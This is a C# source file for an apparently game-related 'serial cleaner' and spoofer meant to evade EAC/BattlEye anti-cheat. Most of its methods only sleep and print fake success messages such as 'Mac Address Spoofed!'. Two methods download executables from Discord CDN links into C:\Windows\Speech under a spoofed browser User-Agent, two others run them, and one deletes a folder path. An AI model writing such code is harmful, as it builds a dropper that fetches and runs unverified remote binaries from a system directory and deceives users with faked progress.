using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Lemon
{
    internal class SerialsClean
    {
        public static void Clean()
        {
            Thread.Sleep(10000);
            Console.WriteLine("[*] Success Clean");
        }
        public static void Spoof()
        {
            Thread.Sleep(5000);
            Console.WriteLine("[*] Success Spoof");
        }
        public static void Adapters()
        {
            Thread.Sleep(7000);
            Console.WriteLine("[*] Adapters Reseted");
        }
        public static void MAC()
        {
            Thread.Sleep(6000);
            Console.WriteLine("[*] Mac Address Spoofed!");
        }
        public static void Spofy()
        {
            Console.WriteLine("[*] Deleting EAC/BE Related Folders");
        }
        public static void Reg()
        {
            File.Delete("C:\\Program Files\\EpicGames");
        }
        public static void Stall()
        {
            Process process = new Process();
            //process.StartInfo.CreateNoWindow = true;
            //process.StartInfo.RedirectStandardInput = true;
            //process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = "C:\\Windows\\Speech\\MAC.exe";
            process.Start();
            //process.WaitForExit();
            //File.Delete("C:\\Windows\\Speech\\net.exe");
            return;
        }
        public static void ok()
        {
            Console.WriteLine("[*] Exiting...");
            Thread.Sleep(2000);
        }
        public static void restart()
        {
            Process process = new Process();
            //process.StartInfo.CreateNoWindow = true;
            //process.StartInfo.RedirectStandardInput = true;
            //process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = "C:\\Windows\\Speech\\Cleaner.exe";
            process.Start();
            //process.WaitForExit();
            //File.Delete("C:\\Windows\\Speech\\net.exe");
            return;
        }
        public static void no()
        {
            Console.WriteLine("[*] Cleaning Leftover Files...");
            Thread.Sleep(2000);
        }
        public static void Download1()
        {
            WebClient webClient = new WebClient();
            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/623970378024222720/630343369519923210/MAC.exe", "C:\\Windows\\Speech\\MAC.exe");
            webClient.Proxy = null;
        }
        public static void Download2()
        {
            WebClient webClient = new WebClient();
            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/632323847995129863/632327951249047584/Cleaner.exe", "C:\\Windows\\Speech\\Cleaner.exe");
            webClient.Proxy = null;
        }
    }
}
